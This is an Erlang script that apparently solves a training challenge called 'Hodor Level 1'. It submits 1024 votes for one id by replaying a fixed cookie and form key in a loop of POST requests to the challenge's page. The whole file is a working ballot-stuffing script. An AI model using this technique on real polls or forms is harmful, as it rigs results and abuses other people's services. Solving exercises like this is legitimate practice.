%% ===-----Hodor Level 1---------------------------------------------===
%%          Hodor Level 1 Project, by Julien Barbier.
%%  "Make 1024 votes in this page: http://173.246.108.142/level1.php"
%%  Solution using Erlang code.
%%
%%  by Alexandro de Oliveira.
%% ===---------------------------------------------------------------===

-module(hodor1).
-export([main/0, for/2, posting/0]).

posting() ->
Cok = "ba5ba0e6c4a60ec481444a36e5a39f07dbc1fe9b",
Method = post,
URL = "http://173.246.108.142/level1.php",
Header = [{"User-Agent","havk64 Erlang Requests"},
    {"Cookie", "HoldTheDoor=" ++ Cok}],
Type = "application/x-www-form-urlencoded",
Body = "id=23&holdthedoor=submit&key=" ++ Cok,
ssl:start(),
application:start(inets),
%% Implementing cookie fetch and parse: (Not done yet)
%{ok, _,Headers, _} = httpc:request(Method, { URL, []}, [], []),
%C = proplists:get_value("set-cookie", Headers),
%A = string:tokens(C, ";"),
%Cookie = array:get(0, A),
httpc:request(Method, {URL, Header, Type, Body }, [], []).

for(0,_) ->
   [];
   for(N,Term) when N > 0 ->
   posting(),
   [Term|for(N-1,Term)].


main() ->
    for(1024, 1).
